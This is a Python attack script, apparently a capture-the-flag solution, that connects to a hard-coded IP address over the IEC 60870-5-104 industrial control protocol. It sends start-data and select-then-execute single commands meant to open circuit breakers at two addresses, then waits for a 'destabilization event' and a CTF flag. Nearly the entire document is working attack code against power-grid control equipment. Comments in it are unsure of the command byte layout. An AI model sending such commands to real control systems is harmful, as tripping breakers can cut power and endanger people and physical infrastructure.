#!/usr/bin/env python3
import socket
import time

HOST = '169.58.126.107'
PORT = 6004

def send_frame(s, apdu):
    s.send(apdu)

def main():
    s = socket.socket()
    s.settimeout(300)
    try:
        print('[*] Connecting...')
        s.connect((HOST, PORT))
        print('[+] Connected')
        
        # STARTDT ACT
        s.send(bytes([0x68, 0x04, 0x07, 0x00, 0x00, 0x00]))
        time.sleep(2)
        r = s.recv(1024)
        print('[+] STARTDT:', r.hex() if r else 'none')
        
        # Try to open breaker at IOA 1 and IOA 2
        # C_SC_NA_1: TypeId 45, VSQ 1, COT 6 (act), CA 1, IOA 3 bytes LE, SCO 1 byte
        # SCO: bit 0 = S/E (0 select, 1 execute), bit 1 = QU (qualifier), bits 2-6 = duration, bit 7 = DCS (0 off/1 on) or similar
        # For single command: DCS is in bits 0 and 1? Or different format
        # Standard: SCO = (S/E << 7) | (QU << 2) | DCS (bits 0,1) for short pulse
        # Or simpler: to turn OFF (trip/open), often DCS = 1, S/E varies
        
        # Try select then operate for IOA 1
        ioa1 = bytes([0x01, 0x00, 0x00]) # IOA 1 LE
        ioa2 = bytes([0x02, 0x00, 0x00]) # IOA 2 LE
        ca = bytes([0x01, 0x00]) # CA 1 LE
        
        # Select (S/E = 0)
        asdu_sel1 = bytes([45, 0x01, 0x06]) + ca + ioa1 + bytes([0x01]) # SCO with select
        s.send(bytes([0x68, len(asdu_sel1)+4, 0x00,0x00,0x00,0x00]) + asdu_sel1)
        time.sleep(2)
        try:
            r = s.recv(1024)
            print('[+] sel1:', r.hex() if r else 'none')
        except:
            pass
        
        # Operate (S/E = 1) 
        asdu_op1 = bytes([45, 0x01, 0x06]) + ca + ioa1 + bytes([0x81]) # execute
        s.send(bytes([0x68, len(asdu_op1)+4, 0x02,0x00,0x00,0x00]) + asdu_op1) # increment tx seq
        time.sleep(2)
        try:
            r = s.recv(1024)
            print('[+] op1:', r.hex() if r else 'none')
        except:
            pass
        
        # Try IOA 2
        asdu_sel2 = bytes([45, 0x01, 0x06]) + ca + ioa2 + bytes([0x01])
        s.send(bytes([0x68, len(asdu_sel2)+4, 0x04,0x00,0x00,0x00]) + asdu_sel2)
        time.sleep(2)
        try:
            r = s.recv(1024)
            print('[+] sel2:', r.hex() if r else 'none')
        except:
            pass
        
        asdu_op2 = bytes([45, 0x01, 0x06]) + ca + ioa2 + bytes([0x81])
        s.send(bytes([0x68, len(asdu_op2)+4, 0x06,0x00,0x00,0x00]) + asdu_op2)
        time.sleep(5)
        try:
            r = s.recv(1024)
            print('[+] op2:', r.hex() if r else 'none')
        except:
            pass
        
        print('[*] Waiting for destabilization event...')
        start = time.time()
        while time.time() - start < 120:
            try:
                s.settimeout(10)
                r = s.recv(4096)
                if not r:
                    break
                print('[+] DATA:', r.hex())
                if b'CTF{' in r:
                    print('[!!!] FLAG FOUND:', r)
                    break
            except socket.timeout:
                # Send TESTFR to keep alive
                try:
                    s.send(bytes([0x68,0x04,0x43,0x00,0x00,0x00]))
                except:
                    pass
                continue
            except:
                break
        print('[*] Done')
    finally:
        s.close()

if __name__ == '__main__':
    main()
